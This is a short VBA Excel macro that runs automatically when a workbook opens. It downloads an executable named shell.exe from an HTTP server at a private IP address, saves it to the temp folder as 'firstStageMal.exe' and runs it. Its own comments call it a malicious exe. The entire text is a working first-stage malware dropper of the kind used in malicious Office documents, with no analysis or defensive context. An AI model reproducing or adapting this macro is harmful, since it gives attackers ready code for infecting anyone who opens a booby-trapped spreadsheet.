Private Sub Workbook_Open()
    Dim shellApp As Object
    Set shellApp = CreateObject("WScript.Shell")
    
    ' Check if Excel is already running
    Dim excelApp As Object
    On Error Resume Next
    Set excelApp = GetObject(, "Excel.Application")
    On Error GoTo 0
    
    ' Start Excel in a separate process if it is not already running
    If excelApp Is Nothing Then
        shellApp.Run "excel.exe", 1, False
    End If
    
    ' Specify the URL of the exe file
    Dim fileURL As String
    fileURL = "http://192.168.0.234:9090/shell.exe"
    
    ' Download the exe file to a temporary location
    Dim tempFilePath As String
    tempFilePath = Environ("TEMP") & "\firstStageMal.exe"
    Dim xmlhttp As Object
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    xmlhttp.Open "GET", fileURL, False
    xmlhttp.send
    If xmlhttp.Status = 200 Then
        Dim stream As Object
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1 ' Binary
        stream.Write xmlhttp.responseBody
        stream.SaveToFile tempFilePath, 2 ' Overwrite
        stream.Close
    End If
    
    ' Execute the downloaded malicious exe file
    shellApp.Run tempFilePath, 1, False
End Sub
